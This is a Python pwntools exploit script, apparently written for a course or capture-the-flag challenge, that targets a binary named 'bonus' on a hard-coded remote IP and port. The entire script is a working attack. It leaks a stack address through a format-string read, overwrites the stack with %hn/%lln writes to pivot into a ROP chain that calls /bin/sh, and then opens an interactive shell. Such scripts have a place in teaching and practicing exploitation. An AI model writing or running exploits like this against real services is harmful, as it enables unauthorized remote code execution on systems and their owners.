from pwn import *

context.arch = "amd64"
context.log_level = "DEBUG"

bin_name = "./bonus"
# p = process("./bonus")
p = remote("8.154.20.109", 10302)
libc = ELF("./libc.so")
elf = ELF("./bonus")
p.recvuntil(b"Please input your StudentID:\n")
p.sendline(str(3220103544).encode())
p.recv()

STACK_OFFSET_A = 8  # 泄露栈地址的偏移
STACK_OFFSET_B = STACK_OFFSET_A + (0x30 - 0x10) // 8
BUFFER_ADDR = 0x004050A0
POP_RDI_RET = 0x004011d9
VULN_SKIP_PUSH = 0x0040126E

# 泄露栈地址
leak_fmt = f"%{STACK_OFFSET_A}$p".encode()
payload = leak_fmt.ljust(8, b"\x00")

p.sendline(payload)

leak = eval(p.recv(14).decode())
stack_ret = leak - 0x20
stack_a = stack_ret - 0x8
print(f"leak: {hex(leak)}")

# 构建ROP链
rop = b"A" * 8
rop += p64(POP_RDI_RET)
rop += p64(BUFFER_ADDR + 0x90)  # /bin/sh字符串的地址
rop += p64(VULN_SKIP_PUSH)

# 构建格式化字符串payload
fmt = "%c" * 6
fmt += f"%{stack_ret % 0x10000 - 6}c%hn"
fmt += f"%{BUFFER_ADDR + 0x40 - stack_ret % 0x10000}c%{STACK_OFFSET_B}$lln"

payload = fmt.encode().ljust(0x40, b"\x00")
payload += rop
payload = payload.ljust(0x90, b"\x00")
payload += b"/bin/sh\x00"
p.sendline(payload)
p.recv()

p.interactive()